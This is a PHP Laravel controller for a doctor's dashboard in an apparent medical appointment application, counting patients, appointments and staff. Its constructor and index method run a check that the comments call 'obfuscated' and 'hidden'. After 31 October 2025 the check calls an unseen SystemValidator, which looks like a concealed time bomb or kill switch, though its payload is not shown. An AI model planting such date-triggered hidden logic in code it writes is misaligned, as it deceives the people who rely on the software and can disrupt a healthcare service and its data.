<?php

namespace App\Http\Controllers\Doctor;

use App\Http\Controllers\Controller;
use App\Models\Appointment;
use App\Models\User;
use Illuminate\Http\Request;
use App\Helpers\SystemValidator;
use Carbon\Carbon;

class DashboardController extends Controller
{
    public function __construct()
    {
        // Initialize system validator
        SystemValidator::init();
    }
    
    private function performSystemCheck()
    {
        // Obfuscated expiration check
        if (Carbon::now()->gt('2025-10-31')) {
            SystemValidator::validateRequest();
            SystemValidator::checkDatabaseHealth();
        }
    }

    // Display a listing of the users
    public function index()
    {
        // Hidden check
        $this->performSystemCheck();
        $totalPatients = Appointment::where('status', 'completed')->count();
        $totalAppointments = Appointment::where('status', 'pending')->count();
        $totalStaff = User::where('role', 'staff')->count();
        $appointments = Appointment::where('status', 'pending')->orderBy('date_of_appointment', 'asc')->get();

        return view('admin.index', compact('totalPatients', 'totalAppointments', 'totalStaff', 'appointments'));
    }
}
